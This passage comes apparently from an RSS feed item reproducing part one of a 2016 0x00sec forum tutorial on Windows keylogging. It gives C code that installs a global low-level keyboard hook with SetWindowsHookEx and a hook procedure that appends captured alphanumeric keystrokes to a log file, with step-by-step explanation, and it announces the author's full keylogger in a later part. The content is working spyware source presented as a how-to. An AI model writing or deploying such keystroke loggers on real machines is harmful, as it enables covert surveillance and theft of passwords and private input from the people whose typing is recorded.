int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// ...
	
	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hModule, 0);
	
	// message loop here
}
</code></pre>
<p>For our <code>SetWindowsHookEx</code>, we require the <code>idHook</code> parameter to be <code>WH_KEYBOARD_LL</code> since it has a global scope. For our dwThreadId parameter, we set it to 0 since this will allow our hook procedure to be associated will all existing threads running on the same desktop as our application. As of yet, our keylogger is useless to us since we have not implemented any method to store the keystrokes.</p>
<h3>Writing Keystrokes to Disk</h3>
<p>First, we need to know about the arguments which are passed into the <code>LoweLevelKeyboardProc</code> function.</p>
<p>According to the MSDN documentation for the <code>LowLevelKeyboardProc</code> function, <code>nCode</code> will hold the value <code>HC_ACTION</code> if <em>" <code>wParam</code> and <code>lParam</code> parameters contain information about a keyboard message"</em>. So only when <code>nCode</code> is equal to <code>HC_ACTION</code> will we need to write to the file, else we do not care. Once we have such a situation, we will need to check the <code>wParam</code> and <code>lParam</code> for information about the keypress. <code>wParam</code> contains information about how the key was pressed such as a key down or key up. <code>lParam</code> is documented as a pointer to a <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644967%28v=vs.85%29.aspx"><code>KBDLLHOOKSTRUCT</code></a> which contains the respective <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx"><code>vkCode</code></a> of the keypress.</p>
<pre><code class="lang-auto">LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
			DWORD vkCode = kbd-&gt;vkCode;
			
			if (vkCode &gt;= 0x30 &amp;&amp; vkCode &lt;= 0x5A) {
				FILE *fp = fopen(KEYLOG_FILE, "a+");
				
				fputc(vkCode, fp);
				
				fclose(fp);
			}
		}
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
</code></pre>
<p>We can typecase the <code>lParam</code> as a pointer to a <code>KBDLLHOOKSTRUCT</code> and assign it to a variable <code>kbd</code>. For this example, we only test for basic input which includes keys ranging from <code>0-9</code> and <code>A-Z</code>. Of course, right now there is a lot missing detail with regards to other keys such as <code>ALT</code>, <code>CTRL</code> and <code>SHIFT</code> and also that it cannot differentiate upper and lower case and symbols. We can easily fix this by manually adding in some tests and switch statements until it reaches our satisfaction. Once we have extracted the <code>vkCode</code> member from <code>kbd</code> and it satisfies the key range, we will open our file defined by <code>KEYLOG_FILE</code> with an append mode and simply add on the <code>vkCode</code> to the end of the file.</p>
<p>After we’ve finished what we intended to do, we can then push the keypress onwards to the next hook procedure.</p>
<hr>
<h2>Conclusion</h2>
<p>In the next part I will showcase my keylogger code and briefly run through its functionality and how it’s achieved. Thanks for reading and stay tuned!</p>
<p><em>– dtm</em></p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/1</link>
        <pubDate>Mon, 02 May 2016 09:33:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-1</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
  </channel>
</rss>
